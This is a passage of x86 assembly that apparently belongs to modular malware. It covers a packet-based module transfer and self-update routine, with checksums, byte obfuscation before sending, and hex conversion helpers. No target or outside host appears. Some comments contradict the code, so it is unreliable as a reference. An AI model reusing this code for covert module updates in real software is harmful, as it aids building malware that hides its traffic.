   cmp     eax,ebx                 ;
   jne     mindbond                ; transfer error ?

   ; here we load it, but we be coded later, normally it's a direct flush into
   ; the module areas

   ;int        3

   loadpointer edx,destbuffer,lpp273
   mov     esi,dword ptr [edx]

   loadpointer edx,uploadinput,lpp276
   movzx       ecx,byte ptr [edx]

   CSyscall    DirectUpdateIt

   mindbond:

   ;call       layer5uninit

   mov     cl,'1'                  ; restart transfer
   call        minisend                ; procedure

   returnlayer8:

   ret

   sendpacket:

   pushad
   pushad

   push        250
   C_apicall   3126C0h,0

   popad

   sub esp, 107
   mov edi,esp

   push    ecx

   mov byte ptr [edi],'5'          ; set data packet

   mov eax,ecx                 ;
   xor ebx,ebx                 ; nullify ebx

   mov ecx,3                   ; drop four char
                           ; from the number of packet
   gen_doitagain:

   push    ecx

   xor edx,edx
   mov ecx,10
   div ecx                 ; div by 8 hexa number

   mov bl,dl                   ; got a number between 0-9
   rol ebx,8                   ; and sotre it into a reg

   pop ecx

   loop    gen_doitagain

   add ebx,'0000'              ; load it as number

   ;xchg   bh,bl
   ;ror    ebx,16
   ;xchg   bh,bl

   mov dword ptr [edi+1],ebx

   loadpointer     ecx,uploadinput,m56
   movzx       ecx,byte ptr [ecx]      ; load the data to be sent

   CSyscall    getmodpointer           ; then get the module pointer

   mov esi,eax                 ; set is as source

   xor edx,edx
   mov ecx,50                  ; load the offset from this

   pop eax

   mul ecx                 ;

   add esi,eax

   add edi,5                   ; set the destination to
                           ; checksum mark
   mov ecx,50
   xor eax,eax

   push    ecx
   push    esi

   gethatmo:

   add al,byte ptr [esi]           ; make checksum of unencrypted
   ror al,1                    ; bytes

   inc esi

   loop    gethatmo                ; do everything

   call    hex2ascii

   pop esi
   pop ecx

   mov word ptr [edi],ax           ; save the checksum
   add edi,2

   getthatma:

   mov al,byte ptr [esi]           ; load the byte

   ror al,cl                   ; encrypt it
   dec al                  ; ror al,cl is cool
   xor al,66                   ; can make quite boring
   add al,cl
                           ; to understand cryptation
   call    hex2ascii

   mov word ptr [edi],ax           ; drop the hex of the byte
   add edi,2

   inc esi
   loop    getthatma               ; perform the 50 bytes

   mov ecx,107                 ; set how much byte to send

   mov edx,edi
   sub edx,ecx

   call    directinput             ; send them

   add esp,107

   popad

   ret

   hex2ascii:

   mov ah,al
   and     al,0F0h                 ; load 1st
   ror al,4
   call    getitnow55              ; convert 1 - 16 to ascii
   and ah,0Fh                  ; load 2nd
   xchg    ah,al
   call    getitnow55              ;
   xchg    ah,al                   ; reverse to be put on mem

   ret

   getitnow55:

   cmp al,9
   ja  setitdigit

   add al,'0'-'A'+9+1              ; for digit

   setitdigit:

   add al,'A'-9-1              ; for bytes
   ret

   ascii2hex:

   call    getitnow56          ; transform from the byte
   xchg    ah,al
   call    getitnow56          ; to normal

   ror     ah,4
   add     al,ah

   ret

   getitnow56:

   sub     al,'0'

   cmp     al,9                ; a number ?
   ja      dontskipit
   ret                 ; finish

   dontskipit:

   sub     al,'A'-'0'-9-1          ; a word ?
   ret

   hex2val:                ;

   xor     eax,eax
   mov     ecx,4

   getthatnowit:

   push    ecx

   sub     bl,'0'              ; load this value

   mov     ecx,10
   xor     edx,edx
   mul     ecx             ;

   push    ebx
   movzx   ebx,bl              ; load byte
   add     eax,ebx             ; add it
   pop ebx

   ror     ebx,8               ; load next ebx

   pop     ecx

   loop    getthatnowit            ; do that 4 times,

   ret                 ; MAX = 500000 bytes

   ;include prorec\prosere.asm

   CSyscall0:      db      68h
   CommodSyscall:  dd      offset RoutineHandler
                   ret

   CommodEnd:

   skiploading:

   end start
